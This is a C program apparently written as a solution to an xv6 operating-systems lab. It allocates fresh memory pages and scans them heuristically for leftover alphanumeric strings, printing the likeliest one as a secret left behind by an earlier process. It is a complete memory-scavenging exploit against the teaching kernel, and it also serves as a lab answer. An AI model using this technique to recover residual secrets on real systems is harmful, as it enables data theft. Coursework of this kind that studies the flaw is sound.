// user/attack.c
// Integer-only heuristic xv6 attack for the uninitialized-page lab.
// Scores candidates by length, digit presence, uniqueness, and position.
// Avoids floating point (no FPU instructions).

#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

#define PAGE 4096
#define MAX_PAGES 200       // probe up to ~800 KB
#define MIN_SECRET_LEN 4
#define MAX_SECRET_LEN 1024

static int isalnum_char(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

static int is_hex_diag(const char *s, int len) {
  const char *pattern = "0123456789ABCDEF0123456789ABCDEF";
  int plen = 32;
  if (len < 4) return 0;
  for (int start = 0; start + len <= plen; start++) {
    int k;
    for (k = 0; k < len; k++) {
      if (s[k] != pattern[start + k]) break;
    }
    if (k == len) return 1;
  }
  return 0;
}

int
main(int argc, char *argv[]) {
  // allocate pages one-by-one
  char *first = 0;
  int pages = 0;
  for (int i = 0; i < MAX_PAGES; i++) {
    char *p = sbrk(PAGE);
    if (p == (char*)-1) break;
    if (pages == 0) first = p;
    pages++;
  }

  if (pages == 0) exit(0);

  int total = pages * PAGE;
  char *buf = first;

  int best_i = -1;
  int best_len = 0;
  int best_score = -2147483648; // very small

  for (int i = 0; i < total; ) {
    if (!isalnum_char(buf[i])) { i++; continue; }
    int j = i;
    int has_digit = 0;
    int has_alpha = 0;
    int freq[128];
    for (int f = 0; f < 128; f++) freq[f] = 0;
    while (j < total && isalnum_char(buf[j]) && (j - i) < MAX_SECRET_LEN) {
      unsigned char c = buf[j];
      freq[c]++;
      if (c >= '0' && c <= '9') has_digit = 1;
      if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')) has_alpha = 1;
      j++;
    }
    int len = j - i;
    if (len >= MIN_SECRET_LEN && !is_hex_diag(buf + i, len)) {
      // compute uniqueness ratio scaled by 1000: uniq_ratio = unique*1000/len
      int unique = 0;
      for (int k = 0; k < 128; k++) if (freq[k]) unique++;
      int uniq_ratio_x1000 = (len > 0) ? (unique * 1000 / len) : 0;

      // integer scoring (scale everything to avoid floats)
      // base score: length * 200
      int score = len * 200;
      // bonus if contains digit
      if (has_digit) score += 800;
      // bonus for uniqueness: uniq_ratio_x1000 * len / 100
      score += (uniq_ratio_x1000 * len) / 100;
      // small boost if mixture of letters and digits
      if (has_digit && has_alpha) score += 400;
      // extra boost for higher uniqueness
      if (uniq_ratio_x1000 > 450) score += 300;
      // position penalty (earlier is better). i/2048 approximated: subtract i/2^11
      score -= (i >> 11);

      if (score > best_score) {
        best_score = score;
        best_i = i;
        best_len = len;
      }
    }
    i = j;
  }

  if (best_i >= 0 && best_len > 0) {
    if (best_len > MAX_SECRET_LEN) best_len = MAX_SECRET_LEN;
    write(1, buf + best_i, best_len);
    write(1, "\n", 1);
    exit(0);
  }

  // fallback: nothing found
  exit(0);
}
